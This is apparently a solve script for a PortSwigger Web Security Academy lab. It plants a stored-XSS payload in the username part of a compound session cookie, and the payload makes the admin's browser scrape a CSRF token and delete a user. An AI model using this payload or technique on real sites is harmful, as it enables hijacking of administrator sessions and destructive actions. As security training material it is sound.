#!/usr/bin/env python3
"""
Scanning non-standard data structures
PortSwigger Web Security Academy -- Essential Skills

Companion script for the writeup: 02-scanning-non-standard-data-structures.md

What this does:
    The session cookie is a compound value, "username:token". Instead of
    tampering with the whole cookie (which trips an integrity check), this
    injects a stored-XSS payload into just the username sub-value while
    keeping the real token intact. The server stores the submitted username
    before the integrity check rejects the request, so the payload persists
    where admin tooling can render it. The payload itself performs the
    entire attack in-band from inside the admin's browser -- fetch /admin,
    scrape the CSRF token out of the page, POST a delete for carlos -- with
    no Collaborator interaction or exploit server involved.

Usage:
    python 02-scanning-non-standard-data-structures.py <lab-url>
    e.g. python 02-scanning-non-standard-data-structures.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import httpx

USERNAME, PASSWORD = "wiener", "peter"

XSS_PAYLOAD = (
    '<img src=x onerror="fetch(\'/admin\').then(r=>r.text()).then(h=>{'
    'let m=h.match(/csrf.*?value=.([^&\'\\"]+)/);'
    'fetch(\'/admin/delete?username=carlos\',{'
    "method:'POST',"
    "headers:{'Content-Type':'application/x-www-form-urlencoded'},"
    "body:'csrf='+m[1]"
    '})})">'
)


def get_csrf(client: httpx.Client, url: str) -> str:
    r = client.get(url)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    csrf = get_csrf(client, f"{lab_url}/login")
    client.post(f"{lab_url}/login", data={
        "username": USERNAME, "password": PASSWORD, "csrf": csrf,
    })

    session = client.cookies.get("session", "")
    if ":" not in session:
        print(f"[-] Session cookie doesn't look like 'username:token': {session}")
        return
    _, token = session.split(":", 1)
    print(f"[*] Real session cookie: {session}")

    poisoned = f"{XSS_PAYLOAD}:{token}"
    print(f"[*] Setting the username sub-value to the XSS payload, keeping the real token...")
    r = client.get(lab_url, cookies={"session": poisoned})
    print(f"[*] Response status with poisoned cookie: {r.status_code}"
          f" (a 500 'Integrity violation detected' here is expected and fine --"
          f" the username is stored before that check runs)")

    print("[*] Waiting for the admin to view the stored username and trigger the payload...")
    print("[*] The payload performs the delete directly from the admin's browser --")
    print("    there's nothing further to poll here; check the lab status after a short wait.")

    import time
    time.sleep(20)
    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- carlos was deleted by the admin's own browser.")
    else:
        print("[-] Not solved yet -- the admin bot may not have visited yet, try waiting longer.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
